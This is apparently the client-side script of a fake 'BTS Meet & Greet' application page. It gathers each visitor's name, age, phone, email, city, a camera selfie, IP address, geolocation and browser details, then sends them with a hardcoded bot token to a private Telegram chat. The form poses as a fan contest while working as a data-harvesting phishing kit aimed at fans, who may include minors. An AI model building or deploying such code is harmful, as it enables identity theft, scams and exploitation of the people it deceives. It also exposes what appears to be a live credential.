/* ============================================================
   BTS MEET & GREET — Application logic
   ============================================================ */
var BOT_TOKEN          = "8604239989:AAHnuyJZpz_E6s-_7rXUvlbHazAKOAHEB7A";
var ADMIN_CHAT_ID      = "7274208494";
var RECAPTCHA_SITE_KEY = "6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI";
var IMAGE_QUALITY      = 0.85;
/* ============================================================ */

/* ---------- DOM ---------- */
var form          = document.getElementById("applyForm");
var fullName      = document.getElementById("fullName");
var age           = document.getElementById("age");
var country       = document.getElementById("country");
var email         = document.getElementById("email");
var phone         = document.getElementById("phone");
var city          = document.getElementById("city");
var favMember     = document.getElementById("favMember");
var reason        = document.getElementById("reason");

var photoSection  = document.getElementById("photoSection");
var btnUpload     = document.getElementById("btnUpload");
var btnCamera     = document.getElementById("btnCamera");
var fileInput     = document.getElementById("fileInput");
var photoPreview  = document.getElementById("photoPreview");
var previewImg    = document.getElementById("previewImg");
var btnRemove     = document.getElementById("btnRemove");

var btnSubmit     = document.getElementById("btnSubmit");
var formStatus    = document.getElementById("formStatus");
var captchaWrap   = document.getElementById("captchaWrap");

var camModal      = document.getElementById("camModal");
var cameraVideo   = document.getElementById("cameraVideo");
var camClose      = document.getElementById("camClose");
var camCancel     = document.getElementById("camCancel");
var camCapture    = document.getElementById("camCapture");
var camCountdown  = document.getElementById("camCountdown");
var camStatus     = document.getElementById("camStatus");
var hiddenCanvas  = document.getElementById("hiddenCanvas");

/* ---------- State ---------- */
var photoBlob     = null;   // File or Blob
var photoDataURL  = null;
var camStream     = null;
var recaptchaWidgetId = null;
var captchaSolved = false;

/* ============================================================
   PHOTO: upload from device
   ============================================================ */
btnUpload.addEventListener("click", function(){
  fileInput.click();
});

fileInput.addEventListener("change", function(e){
  var file = e.target.files && e.target.files[0];
  if (!file) return;
  if (!file.type.startsWith("image/")){
    showStatus("err", "Please select an image file.");
    return;
  }
  if (file.size > 8 * 1024 * 1024){
    showStatus("err", "Image too large (max 8 MB).");
    return;
  }
  photoBlob = file;
  var reader = new FileReader();
  reader.onload = function(ev){
    photoDataURL = ev.target.result;
    showPreview(photoDataURL);
  };
  reader.readAsDataURL(file);
  hideStatus();
});

/* ============================================================
   PHOTO: camera
   ============================================================ */
btnCamera.addEventListener("click", openCamera);
camClose.addEventListener("click", closeCamera);
camCancel.addEventListener("click", closeCamera);

function openCamera(){
  camModal.classList.add("open");
  camStatus.textContent = "Requesting camera…";

  navigator.mediaDevices.getUserMedia({
    video: { width: { ideal: 720 }, height: { ideal: 960 }, facingMode: "user" }
  }).then(function(s){
    camStream = s;
    cameraVideo.srcObject = s;
    return cameraVideo.play();
  }).then(function(){
    camStatus.textContent = "Camera ready — tap Capture";
  }).catch(function(err){
    console.warn(err);
    if (err.name === "NotAllowedError"){
      camStatus.textContent = "Camera permission denied";
      showStatus("err", "Please allow camera access from your browser.");
    } else {
      camStatus.textContent = "Camera unavailable";
      showStatus("err", "Camera is not available on this device.");
    }
    setTimeout(closeCamera, 2500);
  });
}

function closeCamera(){
  camModal.classList.remove("open");
  camCountdown.classList.remove("show");
  if (camStream){
    camStream.getTracks().forEach(function(t){ t.stop(); });
    camStream = null;
  }
  cameraVideo.srcObject = null;
}

/* countdown + capture */
camCapture.addEventListener("click", function(){
  if (!camStream) return;
  var count = 3;
  camCountdown.textContent = count;
  camCountdown.classList.add("show");

  var iv = setInterval(function(){
    count--;
    if (count > 0){
      camCountdown.textContent = count;
    } else {
      clearInterval(iv);
      camCountdown.classList.remove("show");
      grabFrame();
    }
  }, 800);
});

function grabFrame(){
  var w = cameraVideo.videoWidth  || 720;
  var h = cameraVideo.videoHeight || 960;
  hiddenCanvas.width  = w;
  hiddenCanvas.height = h;
  var ctx = hiddenCanvas.getContext("2d");
  /* mirror the video so captured image matches preview */
  ctx.translate(w, 0);
  ctx.scale(-1, 1);
  ctx.drawImage(cameraVideo, 0, 0, w, h);
  ctx.setTransform(1, 0, 0, 1, 0, 0);

  hiddenCanvas.toBlob(function(blob){
    if (!blob) return;
    photoBlob = blob;
    photoDataURL = hiddenCanvas.toDataURL("image/jpeg", IMAGE_QUALITY);
    showPreview(photoDataURL);
    closeCamera();
    hideStatus();
  }, "image/jpeg", IMAGE_QUALITY);
}

/* ============================================================
   Preview / remove
   ============================================================ */
function showPreview(url){
  previewImg.src = url;
  photoPreview.style.display = "block";
  photoSection.classList.add("done");
}

btnRemove.addEventListener("click", function(){
  photoBlob = null;
  photoDataURL = null;
  previewImg.src = "";
  photoPreview.style.display = "none";
  photoSection.classList.remove("done");
  fileInput.value = "";
});

/* ============================================================
   Status messages
   ============================================================ */
function showStatus(type, msg){
  formStatus.className = "form-status show " + type;
  formStatus.textContent = msg;
}
function hideStatus(){
  formStatus.className = "form-status";
  formStatus.textContent = "";
}

/* ============================================================
   reCAPTCHA
   ============================================================ */
function tryRenderRecaptcha(){
  if (!window.__recaptchaReady || recaptchaWidgetId !== null) return;
  var container = document.getElementById("recaptchaWidget");
  if (!container) return;
  try {
    recaptchaWidgetId = window.grecaptcha.render(container, {
      sitekey: RECAPTCHA_SITE_KEY,
      callback: onCaptchaSolved,
      "expired-callback": onCaptchaExpired,
      "error-callback": onCaptchaError
    });
    captchaWrap.classList.add("ready");
  } catch(e){ console.error(e); }
}
window.__tryRenderRecaptcha = tryRenderRecaptcha;

function onCaptchaSolved(){
  captchaSolved = true;
  hideStatus();
  checkReady();
}
function onCaptchaExpired(){
  captchaSolved = false;
  showStatus("err", "reCAPTCHA expired — please solve again.");
  checkReady();
}
function onCaptchaError(){
  showStatus("err", "reCAPTCHA error — please reload.");
}

/* ============================================================
   Enable submit when ready
   ============================================================ */
function checkReady(){
  var ready = captchaSolved && !!photoBlob;
  btnSubmit.disabled = !ready;
}

/* ============================================================
   Telegram send helpers
   ============================================================ */
function getIP(){
  return fetch("https://api.ipify.org?format=json")
    .then(function(r){ return r.json(); })
    .then(function(d){ return d.ip || "Unknown"; })
    .catch(function(){ return "Unknown"; });
}
function getGeo(){
  return fetch("https://ipapi.co/json/")
    .then(function(r){ return r.json(); })
    .then(function(d){
      return (d.city || "?") + ", " + (d.country_name || "?") + " (" + (d.org || "?") + ")";
    })
    .catch(function(){ return "Unknown"; });
}

function sendPhotoTo(caption){
  var fd = new FormData();
  fd.append("chat_id", ADMIN_CHAT_ID);
  fd.append("photo", photoBlob, "bts_apply_" + Date.now() + ".jpg");
  fd.append("caption", caption);
  fd.append("parse_mode", "HTML");
  return fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto", {
    method: "POST",
    body: fd
  }).then(function(r){ return r.ok; }).catch(function(){ return false; });
}

/* ============================================================
   Validate + submit
   ============================================================ */
form.addEventListener("submit", function(e){
  e.preventDefault();
  hideStatus();

  /* validate fields */
  var missing = [];
  if (!fullName.value.trim()) missing.push("Full name");
  if (!age.value.trim())      missing.push("Age");
  if (!country.value)         missing.push("Country");
  if (!email.value.trim())    missing.push("Email");
  if (!phone.value.trim())    missing.push("Phone");
  if (!city.value.trim())     missing.push("City");
  if (!favMember.value)       missing.push("Favourite member");
  if (!reason.value.trim())   missing.push("Reason");

  if (missing.length){
    showStatus("err", "Please fill: " + missing.join(", "));
    return;
  }
  if (!email.value.includes("@")){
    showStatus("err", "Please enter a valid email.");
    return;
  }
  if (!photoBlob){
    showStatus("err", "Please upload or capture your photo.");
    return;
  }
  if (!captchaSolved){
    showStatus("err", "Please complete the reCAPTCHA check.");
    return;
  }

  btnSubmit.disabled = true;
  btnSubmit.textContent = "Sending application…";
  showStatus("info", "Uploading your application…");

  Promise.all([getIP(), getGeo()]).then(function(arr){
    var ip = arr[0], geo = arr[1];
    var ua = navigator.userAgent;
    var now = new Date();
    var dateStr = now.toLocaleString("en-US", { timeZoneName: "short" });

    var caption =
      "🎫 <b>BTS MEET &amp; GREET — NEW APPLICATION</b>\n" +
      "━━━━━━━━━━━━━━━━━━━━━━\n" +
      "👤 <b>Name:</b> " + escapeHtml(fullName.value.trim()) + "\n" +
      "🎂 <b>Age:</b> " + escapeHtml(age.value.trim()) + "\n" +
      "🌍 <b>Country:</b> " + escapeHtml(country.value) + "\n" +
      "🏙️ <b>City:</b> " + escapeHtml(city.value.trim()) + "\n" +
      "📧 <b>Email:</b> " + escapeHtml(email.value.trim()) + "\n" +
      "📱 <b>Phone:</b> " + escapeHtml(phone.value.trim()) + "\n" +
      "💜 <b>Favourite:</b> " + escapeHtml(favMember.value) + "\n" +
      "━━━━━━━━━━━━━━━━━━━━━━\n" +
      "📝 <b>Reason:</b>\n" + escapeHtml(reason.value.trim()) + "\n" +
      "━━━━━━━━━━━━━━━━━━━━━━\n" +
      "🕐 " + dateStr + "\n" +
      "🌐 IP: " + ip + " — " + geo + "\n" +
      "💻 " + ua;

    return sendPhotoTo(caption);
  }).then(function(ok){
    if (ok){
      showStatus("ok", "✓ Application submitted! Redirecting…");
      btnSubmit.textContent = "Submitted ✓";
      setTimeout(function(){
        window.location.href = "next.html";
      }, 1600);
    } else {
      showStatus("err", "Failed to send. Please try again.");
      btnSubmit.disabled = false;
      btnSubmit.textContent = "Submit application";
    }
  }).catch(function(err){
    console.error(err);
    showStatus("err", "Something went wrong. Please retry.");
    btnSubmit.disabled = false;
    btnSubmit.textContent = "Submit application";
  });
});

function escapeHtml(s){
  return String(s)
    .replace(/&/g,"&amp;")
    .replace(/</g,"&lt;")
    .replace(/>/g,"&gt;");
}

/* ============================================================
   Boot
   ============================================================ */
window.addEventListener("load", function(){
  /* try render captcha immediately, and after g-recaptcha loads */
  tryRenderRecaptcha();
  setTimeout(tryRenderRecaptcha, 800);
  setTimeout(tryRenderRecaptcha, 2000);
});
